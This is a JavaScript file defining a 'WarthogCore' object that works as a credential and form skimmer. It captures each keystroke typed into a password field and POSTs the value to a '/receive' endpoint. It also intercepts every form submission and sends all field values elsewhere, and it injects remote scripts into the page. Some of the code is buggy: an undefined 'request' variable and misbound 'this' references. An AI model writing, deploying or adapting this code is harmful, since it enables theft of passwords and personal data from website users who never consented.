var WarthogCore = function() {
	this.dependancies = [];
	this.dependanciesLoaded = 0;
	this.url = "";
	this.startup();
}

WarthogCore.prototype.ajax = function ajax(method, url, callback) {
	xhr = new XMLHttpRequest();
	xhr.open(method, url);

	if (method == "POST") {
		xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
	}

	xhr.onreadystatechange = function() {
		if (callback && request.readyState == 4 && request.status == 200) {
			callback(request.responseText);
		}
	};

	return xhr;
}

WarthogCore.prototype.socket = function socket() {

}

WarthogCore.prototype.formListener = function formListener() {
	var forms = document.getElementsByTagName("form"),
            	formsLength = forms.length;

	for (var i = 0; i < formsLength; i++) {
		if (forms[i].addEventListener) {
			forms[i].addEventListener("submit", this.send, false); //Modern browsers
		} else if (forms[i].attachEvent) {
			forms[i].attachEvent('onsubmit', this.send); //Old IE
		}
	}
}

WarthogCore.prototype.send = function send(e) {
	e.preventDefault();

	var data = [].filter.call(this.elements, function(el) {
		return el;
	}).map(function(el) {
		return {
			name: el.name,
			value: el.value,
			method: el.form.method,
			action: el.form.action
		};
	});

	var xhr = this.ajax("POST", this.url);
	xhr.send(data)
}

WarthogCore.prototype.dependancyInjection = function dependancyInjection() {
	var dependanciesLgt = this.dependancies.length;	

	for(var i = 0; i < dependanciesLgt; i++) {
		var id = this.dependancies[i].id;
		var url = this.dependancies[i].url;
		var callback = this.dependancies[i].callback;

		this.injectScript("script", id, url, callback);
	}
}

WarthogCore.prototype.injectScript = function injectScript(type, id, url, callback) {
	var js, fjs = document.getElementsByTagName(type)[0];

	if (document.getElementById(id)) { return; }

	js = document.createElement(type);
	js.id = id;
	js.onload = callback;
	js.src = url;

	fjs.parentNode.insertBefore(js, fjs);
}

WarthogCore.prototype.startup = function startup() {
	var self = this;
	var nb = 0;
	var el = document.getElementById("passwd");

	el.onkeyup = function(evt) {
		var val = el.value;
		var len = val.length;

		if (len > nb) {
			nb++;

			var query = [];
			query.push("pass=" + escape(encodeURI(el.value)));
			query.push("nb_char=" + nb);

			xhr = self.ajax("POST", "/receive");
			xhr.send(query.join('&'));
		} else {
			nb--;
		}

		if (len == 0) {
			nb = 0;
		}
	};
}

var x = new WarthogCore();
